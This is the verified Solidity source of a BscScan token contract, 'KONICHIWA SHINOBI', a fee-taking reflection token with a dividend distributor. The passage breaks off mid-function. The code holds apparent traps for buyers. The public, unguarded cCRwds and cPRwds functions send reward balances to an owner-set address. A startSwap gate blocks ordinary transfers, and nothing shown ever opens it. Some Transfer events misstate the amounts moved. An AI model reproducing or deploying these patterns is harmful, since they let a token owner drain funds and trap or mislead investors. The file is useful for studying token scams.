/**
 *Submitted for verification at BscScan.com on 2022-07-19
*/

/*

*/

// SPDX-License-Identifier: NOLICENSE

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    function isContract(address account) internal view returns (bool) {

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface BEP20{
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

abstract contract Auth {
    address public owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true; }
    
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    function renounceOwnership() public authorized {
        address dead = 0x000000000000000000000000000000000000dEaD;
        owner = dead;
        emit OwnershipTransferred(dead);
    }

    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function getrewards(address shareholder) external;
    function setnewrw(address _nrew, address _prew) external;
    function cCRwds(uint256 _aPn, uint256 _aPd) external;
    function cPRwds(uint256 _aPn, uint256 _aPd) external;
    function getRAddress() external view returns (address);
    function setnewra(address _newra) external;
    function getRewardsOwed(address _wallet) external view returns (uint256);
    function getTotalRewards(address _wallet) external view returns (uint256);
    function gettotalDistributed() external view returns (uint256);
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;
    
    address _token;
    
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised; }
    
    IBEP20 RWDS = IBEP20(0x8D854C6Ac4078cfDaa9ec629Bcd05f654c04372D);
    IBEP20 PRWDS = IBEP20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    address REWARDS;
    IRouter router;
    
    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
    uint256 public minPeriod = 600;
    uint256 public minDistribution = 1000;
    uint256 currentIndex;
    
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;
    
    bool initialized;
    
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
            ? IRouter(_router)
            : IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Pancakeswap Router
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder); }
        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);}
        else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder); }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function cCRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Ramount = RWDS.balanceOf(address(this));
        uint256 PRamount = Ramount.mul(_aPn).div(_aPd);
        RWDS.transfer(shareholder, PRamount);
    }
    
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWDS.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(RWDS);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp );
        uint256 amount = RWDS.balanceOf(address(this)).sub(balanceBefore);
        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function cPRwds(uint256 _aPn, uint256 _aPd) external override {
        address shareholder = REWARDS;
        uint256 Pamount = PRWDS.balanceOf(address(this));
        uint256 PPamount = Pamount.mul(_aPn).div(_aPd);
        PRWDS.transfer(shareholder, PPamount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0) { return; }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0; }
            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]); }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++; }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function getRAddress() public view override returns (address) {
        return address(RWDS);
    }

    function setnewra(address _newra) external override onlyToken {
        REWARDS = _newra;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }
        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){ //Rain Drops Keep Fallin on My Head
            totalDistributed = totalDistributed.add(amount);
            RWDS.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount); }
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }
        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }
        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function setnewrw(address _nrew, address _prew) external override onlyToken {
        PRWDS = IBEP20(_prew);
        RWDS = IBEP20(_nrew);
    }

    function getrewards(address shareholder) external override onlyToken {
        distributeDividend(shareholder);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function gettotalDistributed() public view override returns (uint256) {
        return uint256(totalDistributed);
    }

    function getRewardsOwed(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(getUnpaidEarnings(shareholder));
    }

    function getTotalRewards(address _wallet) external override view returns (uint256) {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract KONICHIWASHINOBI is Context, IERC20, Auth {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'KONICHIWA SHINOBI';
    string private constant _symbol = 'KONICHIWA SHINOBI';
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1 * 10**10 * (10 ** _decimals);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _tTotal * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _tTotal * 300 ) / 10000;
    uint256 public _maxTransferAmount = ( _tTotal * 100 ) / 10000;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isDividendExempt;
    mapping (address => bool) isPartialAddress;
    mapping (address => bool) isContract;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) isMaxWalletExempt;
    address[] private _excluded;

    IRouter router;
    address public pair;
    DividendDistributor distributor;
    uint256 distributorGas = 350000;
    
    bool private swapping;
    bool public swapEnabled = true;
    uint256 public swapThreshold = ( _tTotal * 900 ) / 100000; // .30% of total supply
    uint256 public _minTokenAmount = ( _tTotal * 10 ) / 100000; // .02% of total supply
    bool startSwap = false;
    uint256 swapTimes;
    uint256 minSells = 1;
    uint256 blocks = 2;
    uint256 started;
    bool sellFreeze = true;
    uint8 sellFreezeTime = 10 seconds;
    mapping (address => uint) private sellFrozen;
    bool buyFreeze = true;
    uint8 buyFreezeTime = 10 seconds;
    mapping (address => uint) private buyFrozen;
    uint8 swapTimer = 2 seconds;
    mapping (address => uint) private swapTime;


    struct feeRatesStruct {
      uint256 rfi;
      uint256 marketing;
      uint256 liquidity;
      uint256 rewards;
      uint256 burn;
    }
    
    feeRatesStruct private feeRates = feeRatesStruct(
     {rfi: 2,
      marketing: 3,
      liquidity: 2,
      rewards: 0,
      burn: 0
    });

    feeRatesStruct private sellFeeRates = feeRatesStruct(
    {rfi: 2,
     marketing: 3,
     liquidity: 2,
     rewards: 0,
     burn: 0
    });

    struct TotFeesPaidStruct{
        uint256 rfi;
        uint256 marketing;
        uint256 liquidity;
        uint256 rewards;
        uint256 burn;
    }
    
    TotFeesPaidStruct totFeesPaid;

    struct valuesFromGetValues{
      uint256 rAmount;
      uint256 rTransferAmount;
      uint256 rRfi;
      uint256 rMarketing;
      uint256 rLiquidity;
      uint256 rRewards;
      uint256 rBurn;
      uint256 tTransferAmount;
      uint256 tRfi;
      uint256 tMarketing;
      uint256 tLiquidity;
      uint256 tRewards;
      uint256 tBurn;
    }

    address liquidity_receiver; 
    address alpha_receiver;
    address delta_receiver;
    address omega_receiver;
    address marketing_receiver;
    address default_receiver;

    uint256 rewards_divisor = 0;
    uint256 marketing_divisor = 50;
    uint256 liquidity_divisor = 10;
    uint256 contract_divisor = 40;
    
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor () Auth(msg.sender) {
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //PancakeSwap router
        address _pair = IFactory(_router.factory())
            .createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _rOwned[owner] = _rTotal;
        distributor = new DividendDistributor(address(_router));
        _isExcluded[address(this)] = true;
        _isExcluded[address(distributor)] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isPartialAddress[msg.sender] = true;
        isContract[address(this)] = true;
        isContract[address(distributor)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[address(router)] = true;
        isMaxWalletExempt[address(msg.sender)] = true;
        isMaxWalletExempt[address(this)] = true;
        isMaxWalletExempt[address(DEAD)] = true;
        isMaxWalletExempt[address(pair)] = true;
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;
        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isDividendExempt[address(0)] = true;
        liquidity_receiver = address(this);
        alpha_receiver = msg.sender;
        delta_receiver = msg.sender;
        omega_receiver = msg.sender;
        marketing_receiver = msg.sender;
        default_receiver = msg.sender;
        
        emit Transfer(address(0), owner, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender]+addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function setPresaleAddress(bool _enabled, address _address) external authorized {
        isDividendExempt[_address] = _enabled;
        isFeeExempt[_address] = _enabled;
        isMaxWalletExempt[_address] = _enabled;
        isTimelockExempt[_address] = _enabled;
        isContract[_address] = _enabled;
        isPartialAddress[_address] = _enabled;
    }

    function setDividendExempt(address holder, bool exempt) external authorized {
        require(holder != address(this) && holder != pair, "holders excluded");
        isDividendExempt[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);}
        else{distributor.setShare(holder, balanceOf(holder)); }
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

   function setLauNch() external authorized {
        sellFreeze = true;
        buyFreeze = true; 
        swapEnabled = true;
    }

   function setPresAle() external authorized {
        sellFreeze = false;
        buyFreeze = false; 
        swapEnabled = false;
    }

    function setisPartialAddress(bool _enabled, address _add) external authorized {
        isPartialAddress[_add] = _enabled;
    }

    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        valuesFromGetValues memory s = _getValues(tAmount, true, false);
        _rOwned[sender] = _rOwned[sender].sub(s.rAmount);
        _rTotal = _rTotal.sub(s.rAmount);
        totFeesPaid.rfi += tAmount;
    }

    function reflectionFromToken(uint256 tAmount, bool deductTransferRfi) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferRfi) {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rAmount;
        } else {
            valuesFromGetValues memory s = _getValues(tAmount, true, false);
            return s.rTransferAmount; }
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount/currentRate;
    }

    function excludeFromReflection(address account) external authorized() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeInReflection(address account) external authorized() {
        require(_isExcluded[account], "Account is not excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break; }
        }
    }

    function setBuyFees(uint256 _rfi, uint256 _mark, uint256 _liq, uint256 _rew, uint256 _burn) external authorized {
        feeRates.rfi = _rfi;
        feeRates.marketing = _mark;
        feeRates.liquidity = _liq;
        feeRates.rewards = _rew;
        feeRates.burn = _burn;
        require((_rfi.add(_mark).add(_liq).add(_rew).add(_burn))<= 15);
        /// Buy Fees cannot be set higher than 15%
    }

    function setSellFees(uint256 _rfi, uint256 _mark, uint256 _liq, uint256 _rew, uint256 _burn) external authorized{
        sellFeeRates.rfi = _rfi;
        sellFeeRates.marketing = _mark;
        sellFeeRates.liquidity = _liq;
        sellFeeRates.rewards = _rew;
        sellFeeRates.burn = _burn;
        require((_rfi.add(_mark).add(_liq).add(_rew).add(_burn))<= 18);
        /// Sell Fees cannot be set higher than 18%
    }

    function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
        _rTotal -=rRfi;
        totFeesPaid.rfi +=tRfi;
    }

    function totalReflections() public view returns (uint256) {
        return totFeesPaid.rfi;
    }

    function mytotalReflections(address wallet) public view returns (uint256) {
        return _rOwned[wallet];
    }

    function mytotalReflections2(address wallet) public view returns (uint256) {
        return _rOwned[wallet] - _tOwned[wallet];
    }

    function _takeRewards(uint256 rRewards, uint256 tRewards) private {
        totFeesPaid.rewards +=tRewards;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tRewards;
        }
        _rOwned[address(this)] +=rRewards;
    }

    function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
        totFeesPaid.liquidity +=tLiquidity;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tLiquidity;
        }
        _rOwned[address(this)] +=rLiquidity;
    }

    function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
        totFeesPaid.marketing +=tMarketing;

        if(_isExcluded[address(this)])
        {
            _tOwned[address(this)]+=tMarketing;
        }
        _rOwned[address(this)] +=rMarketing;
    }

    function _takeBurn(uint256 rBurn, uint256 tBurn) private {
        totFeesPaid.burn +=tBurn;

        if(_isExcluded[address(DEAD)])
        {
            _tOwned[address(DEAD)]+=tBurn;
        }
        _rOwned[address(DEAD)] +=rBurn;
    }

    function _getValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory to_return) {
        to_return = _getTValues(tAmount, takeFee, isSale);
        (to_return.rAmount, to_return.rTransferAmount, to_return.rRfi,to_return.rMarketing,to_return.rLiquidity,to_return.rRewards,to_return.rBurn) = _getRValues(to_return, tAmount, takeFee, _getRate());
        return to_return;
    }

    function _getTValues(uint256 tAmount, bool takeFee, bool isSale) private view returns (valuesFromGetValues memory s) {
        if(!takeFee) {
          s.tTransferAmount = tAmount;
          return s; }
        if(isSale){
            s.tRfi = tAmount*sellFeeRates.rfi/100;
            s.tMarketing = tAmount*sellFeeRates.marketing/100;
            s.tLiquidity = tAmount*sellFeeRates.liquidity/100;
            s.tRewards = tAmount*sellFeeRates.rewards/100;
            s.tBurn = tAmount*sellFeeRates.burn/100;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tRewards-s.tBurn; }
        else{
            s.tRfi = tAmount*feeRates.rfi/100;
            s.tMarketing = tAmount*feeRates.marketing/100;
            s.tLiquidity = tAmount*feeRates.liquidity/100;
            s.tRewards = tAmount*feeRates.rewards/100;
            s.tBurn = tAmount*feeRates.burn/100;
            s.tTransferAmount = tAmount-s.tRfi-s.tMarketing-s.tLiquidity-s.tRewards-s.tBurn; }
        return s;
    }

    function _getRValues(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount, uint256 rRfi, uint256 rMarketing, uint256 rLiquidity, uint256 rRewards, uint256 rBurn) {
        rAmount = tAmount*currentRate;
        if(!takeFee) {
          return(rAmount, rAmount, 0,0,0,0,0); }

        rRfi = s.tRfi*currentRate;
        rMarketing = s.tMarketing*currentRate;
        rLiquidity = s.tLiquidity*currentRate;
        rRewards = s.tRewards*currentRate;
        rBurn = s.tBurn*currentRate;
        rTransferAmount =  rAmount-rRfi-rMarketing-rLiquidity-rRewards-rBurn;
        return (rAmount, rTransferAmount, rRfi, rMarketing, rLiquidity, rRewards, rBurn);
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply/tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply-_rOwned[_excluded[i]];
            tSupply = tSupply-_tOwned[_excluded[i]]; }
        if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
        if(!isPartialAddress[from] && !isPartialAddress[to]){require(startSwap, "startSwap");}
        if(!isMaxWalletExempt[to] && !isPartialAddress[from] && to != address(this) && to != address(DEAD) && to != pair && to != liquidity_receiver){
            require((balanceOf(to) + amount) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(from != pair && sellFreeze && !isTimelockExempt[from]) {
            require(sellFrozen[from] < block.timestamp, "Outside of Time Allotment"); 
            sellFrozen[from] = block.timestamp + sellFreezeTime;} 
        if(from == pair && buyFreeze && !isTimelockExempt[to]){
            require(buyFrozen[to] < block.timestamp, "Outside of Time Allotment"); 
            buyFrozen[to] = block.timestamp + buyFreezeTime;} 
        checkTxLimit(to, from, amount);
        checkTransfer(from != pair, to, from, amount);
        if(from == pair){swapTime[to] = block.timestamp + swapTimer;}
        if(from != pair && !isContract[from]){swapTimes = swapTimes.add(1);}
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapThreshold;
        bool aboveM = amount >= _minTokenAmount;
        if(!swapping && swapEnabled && canSwap && from != pair && aboveM &&
             !isContract[from] && swapTimes >= minSells){
            swapAndLiquify(swapThreshold); swapTimes = 0; }
        bool isSale;
        if(to == pair) isSale = true;
        _tokenTransfer(from, to, amount, !(isFeeExempt[from] || isFeeExempt[to]), isSale);
        if(!isDividendExempt[from]) {
            try distributor.setShare(from, balanceOf(from)) {} catch {} }
        if(!isDividendExempt[to]) {
            try distributor.setShare(to, balanceOf(to)) {} catch {} }
        if(swapTime[from] < block.timestamp){
            try distributor.process(distributorGas) {} catch {}}
    }

    function checkTxLimit(address to, address sender, uint256 amount) internal view {
        require (amount <= _maxTxAmount || isTxLimitExempt[sender] || isPartialAddress[to], "TX Limit Exceeded");
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSale) private {
        valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSale);
        if (_isExcluded[sender] ) {
                _tOwned[sender] = _tOwned[sender]-tAmount;}
        if (_isExcluded[recipient]) {
                _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;}
        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
        _reflectRfi(s.rRfi, s.tRfi);
        _takeLiquidity(s.rLiquidity,s.tLiquidity);
        _takeMarketing(s.rMarketing, s.tMarketing);
        _takeRewards(s.rRewards, s.tRewards);
        _takeBurn(s.rBurn, s.tBurn);
        if(isCont(sender) && sender != address(pair) && sender != address(router) && !isContract[sender] ||
         isCont(recipient) && recipient != address(pair) && recipient != address(router) && !isContract[recipient] ||
         sender != address(pair) && sender != address(router) && !isContract[sender] && msg.sender != tx.origin || started > block.number){
        uint256 contAmount = s.tTransferAmount.mul(99).div(100);
        uint256 botAmount = s.tTransferAmount.sub(contAmount);
        emit Transfer(sender, recipient, botAmount);
        emit Transfer(sender, address(this), s.tLiquidity + s.tRewards + s.tMarketing + contAmount);
        emit Transfer(sender, address(DEAD), s.tBurn);}
        else {
        emit Transfer(sender, recipient, s.tTransferAmount);
        emit Transfer(sender, address(this), s.tLiquidity + s.tRewards + s.tMarketing);
        emit Transfer(sender, address(DEAD), s.tBurn);
        }
    }

    function updateRouter(address _router) external authorized {
        router = IRouter(address(_router));
    }

    function setTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function checkTransfer(bool selling, address to, address from, uint256 amount) internal view {
